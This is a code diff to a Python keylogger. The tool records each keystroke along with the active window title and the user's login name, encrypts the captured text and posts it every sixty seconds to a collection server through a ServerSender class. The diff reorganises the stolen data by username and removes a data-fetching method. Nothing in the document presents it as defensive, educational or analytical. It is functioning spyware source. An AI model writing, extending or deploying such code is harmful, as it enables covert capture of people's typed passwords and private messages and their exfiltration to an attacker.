@@ -6,7 +6,6 @@ import requests
 import time
 from threading import Thread
 import os
-username = os.getlogin()
 
 
 class KeyLoggerService:
@@ -17,15 +16,19 @@ class KeyLoggerService:
         window = gw.getActiveWindow()
         window = window.title if window else "Unknown Window"
         timestamp = datetime.now().strftime("%d/%m/%y %H:%M")
+        username = os.getlogin()
         key = self._format_key(event.name)
 
-        if window not in self.data_to_send:
-            self.data_to_send[window] = {}
+        if username not in self.data_to_send:
+            self.data_to_send[username] = {}
 
-        if timestamp not in self.data_to_send[window]:
-            self.data_to_send[window][timestamp] = ""
+        if window not in self.data_to_send[username]:
+            self.data_to_send[username][window] = {}
 
-        self.data_to_send[window][timestamp] += key
+        if timestamp not in self.data_to_send[username][window]:
+            self.data_to_send[username][window][timestamp] = ""
+
+        self.data_to_send[username][window][timestamp] += key
 
     def _format_key(self, key_name):
         if key_name == "enter":
@@ -53,24 +56,6 @@ class ServerSender:
     def __init__(self, server_url="http://127.0.0.1:5000/data"):
         self.server_url = server_url
 
-    def get_data(self):
-        try:
-            response = requests.get(self.server_url)
-            if response.status_code == 200:
-                data = response.json()
-
-                combined_data = {}
-                for entry in data:
-                    combined_data.update(entry)
-
-                return combined_data
-            else:
-                print(f"Failed to get data: {response.status_code}, {response.text}")
-                return {}
-        except Exception as err:
-            print(f"Error getting data: {err}")
-            return {}
-
     def send_data(self, data):
         try:
             response = requests.post(self.server_url, json=data)
@@ -80,6 +65,7 @@ class ServerSender:
                 print(f"Failed to send data: {response.status_code}, {response.text}")
         except Exception as err:
             print(f"Error sending data: {err}")
+
 
 class SendingTimer:
     def __init__(self, server_sender, cipher, key_logger, time_to_send=60):
@@ -99,8 +85,14 @@ class SendingTimer:
 
     def _encrypt_data(self, data):
         encrypted_data = {}
-        for window, timestamps in data.items():
-            encrypted_data[window] = {timestamp: self.cipher.encrypt(text) for timestamp, text in timestamps.items()}
+        for user, windows in data.items():
+            encrypted_data[user] = {
+                window: {
+                    timestamp: self.cipher.encrypt(text)
+                    for timestamp, text in timestamps.items()
+                }
+                for window, timestamps in windows.items()
+            }
         return encrypted_data
 
 
